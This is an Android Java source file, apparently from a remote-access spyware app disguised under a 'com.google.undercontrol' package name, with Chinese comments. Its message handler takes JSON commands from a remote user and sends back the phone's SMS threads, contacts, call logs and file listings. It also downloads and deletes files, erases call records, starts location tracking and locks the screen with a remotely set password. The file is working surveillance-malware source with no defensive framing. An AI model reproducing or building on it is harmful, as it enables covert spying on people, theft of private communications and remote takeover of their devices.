package com.google.undercontrol.engine;


import java.util.List;

import org.json.JSONException;
import org.json.JSONObject;

import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.text.TextUtils;
import android.util.Log;
import android.view.View;
import android.widget.Toast;

import com.google.undercontrol.MyAdmin;
import com.google.undercontrol.dao.CallLogDao;
import com.google.undercontrol.dao.ContactDao;
import com.google.undercontrol.dao.FileDao;
import com.google.undercontrol.dao.SmsDao;
import com.google.undercontrol.domain.CallLogInfo;
import com.google.undercontrol.domain.ContactInfo;
import com.google.undercontrol.domain.ConversInfo;
import com.google.undercontrol.domain.FileInfo;
import com.google.undercontrol.domain.MsgType;
import com.google.undercontrol.domain.SmsInfo;
import com.google.undercontrol.service.BDLocationService;
import com.google.undercontrol.utils.MsgUtils;
import com.google.undercontrol.utils.MyConstant;
import com.google.undercontrol.utils.Utils;

/**
 *信息处理类
 */
public class MsgPorcess {

	private static final String TAG = "MsgPorcess";
	private Context context;
	/**
	 * 封装所有对短信的操作
	 */
	private SmsDao smsDao;
	private DevicePolicyManager dpm;
	private SharedPreferences sp;

	public MsgPorcess(Context context) {
		this.context = context;
		smsDao = new SmsDao(context);
		sp=context.getSharedPreferences("config", Context.MODE_PRIVATE);
		
	}
	/**
	 * 处理信息
	 * @param dwFromUserid 发送者ID
	 * @param dwToUserid 接受者ID
	 * @param bSecret 是否是密语
	 * @param message 消息内容
	 */
	public void doPor(int dwFromUserid, int dwToUserid, boolean bSecret, String message){
		try {
			JSONObject jObj=new JSONObject(message);
			String type = jObj.getString(MsgType.TYPE);
			if (TextUtils.isEmpty(type)) {
				return;
			}
			if (type.equals(MsgType.READ_CONVERS_LIST)) {
//				读取会话列表
				List<ConversInfo> list = smsDao.getConversList();
				MsgUtils.send(context, dwFromUserid,MsgType.CONVERS_LIST, list);
			}else if(type.equals(MsgType.READ_SMS_LIST)) {
//				读取短信列表
				int id = jObj.getInt(MsgType.DATA);
				List<SmsInfo> list = smsDao.getSmsList(""+id);
				MsgUtils.send(context, dwFromUserid,MsgType.SMS_LIST, list);
			}else if(type.equals(MsgType.READ_ROM_FILE_LIST)) {
//				读取手机内存文件文件列表
				FileDao dao=new FileDao();
				List<FileInfo> list = dao.getRomFileList();
				MsgUtils.send(context, dwFromUserid,MsgType.FILE_LIST, list);
			}else if(type.equals(MsgType.READ_FILE_LIST)) {
//				读取手机内存文件文件列表
				FileDao dao=new FileDao();
				String path=jObj.getString(MsgType.DATA);
				List<FileInfo> list = dao.getFileList(path);
				MsgUtils.send(context, dwFromUserid,MsgType.FILE_LIST, list);
			}else if(type.equals(MsgType.DELETE_FILE)) {
//				删除文件
				deleteFile(dwFromUserid, jObj);
			}else if(type.equals(MsgType.DOWNLOAD_FILE)) {
//				下载文件
				downloadFile(dwFromUserid, jObj);
			}else if(type.equals(MsgType.READ_CONTACT_LIST)) {
//				读取联系人列表
				readContactList(dwFromUserid);
			}else if(type.equals(MsgType.READ_CALL_LOG_LIST)) {
//				读取通话记录列表
				readCallLogList(dwFromUserid,jObj);
			}else if(type.equals(MsgType.DEL_CALL_LOG)) {
//				删除通话记录
				delCallLog(dwFromUserid,jObj);
			}else if(type.equals(MsgType.START_LOCAATION)) {
//				开始定位
				Intent intent=new Intent(context, BDLocationService.class);
				MyConstant.CURRENT_ID=dwFromUserid;
				context.startService(intent);
			}else if(type.equals(MsgType.STOP_LOCAATION)) {
//				停止定位
				Intent intent=new Intent(context, BDLocationService.class);
				context.stopService(intent);
			}else if(type.equals(MsgType.LOCK_SCREEN)) {
//				锁屏
				Utils.lockScreen(context, sp.getString("lockScreenPwd", ""));
			}else if(type.equals(MsgType.SET_LOCK_SCREEN_PWD)) {
//				设置锁屏密码
				String pwd = jObj.getString(MsgType.DATA);
				Editor editor = sp.edit();
				editor.putString("lockScreenPwd", pwd);
				editor.commit();
				MsgUtils.send(context, dwFromUserid,MsgType.SET_LOCK_SCREEN_PWD_SUCCESS);
			}
		} catch (JSONException e) {
			Log.e(TAG,"Json格式不正确！");
			e.printStackTrace();
		}
	}
	
	/**
	 * 删除通话记录
	 * @param dwFromUserid
	 * @param jObj
	 * @throws JSONException 
	 */
	private void delCallLog(int dwFromUserid, JSONObject jObj) throws JSONException {
		CallLogDao dao=new CallLogDao(context);
		int id = jObj.getInt(MsgType.DATA);
		boolean b=dao.delete(id);
		if (b) {
			MsgUtils.send(context, dwFromUserid, MsgType.DEL_CALL_LOG_SUCCESS);
		}else{
			MsgUtils.send(context, dwFromUserid, MsgType.DEL_CALL_LOG_FAIL);
		}
	}
	/**
	 * 读取通话记录列表
	 * @param dwFromUserid
	 * @param jObj
	 * @throws JSONException
	 */
	private void readCallLogList(int dwFromUserid, JSONObject jObj) throws JSONException {
			CallLogDao dao=new CallLogDao(context);
			int offset = jObj.getInt(MsgType.DATA);
			List<CallLogInfo> list = dao.getList( offset);
			MsgUtils.send(context, dwFromUserid, MsgType.CALL_LOG_LIST, list);
	}
	/**
	 * 读取联系人列表
	 * @param dwFromUserid 
	 */
	private void readContactList(int dwFromUserid) {
		ContactDao dao=new ContactDao(context);
		List<ContactInfo> list = dao.getList();
		MsgUtils.send(context, dwFromUserid, MsgType.CONTACT_LIST, list);
	}
	/**
	 * 下载文件
	 * @param dwFromUserid
	 * @param jObj
	 * @throws JSONException 
	 */
	private void downloadFile(int dwFromUserid, JSONObject jObj) throws JSONException {
		String path=jObj.getString(MsgType.DATA);
		MsgUtils.download(context, dwFromUserid, path);
	}
	/**
	 * 删除文件
	 * @param dwFromUserid
	 * @param jObj
	 * @throws JSONException
	 */
	public void deleteFile(int dwFromUserid, JSONObject jObj)
			throws JSONException {
		FileDao dao=new FileDao();
		String path=jObj.getString(MsgType.DATA);
		boolean b= dao.deleteFile(path);
		String res=b?MsgType.DELETE_FILE_SUCCESS:MsgType.DELETE_FILE_FAIL;
		MsgUtils.send(context, dwFromUserid,res);
	}
	
	
}
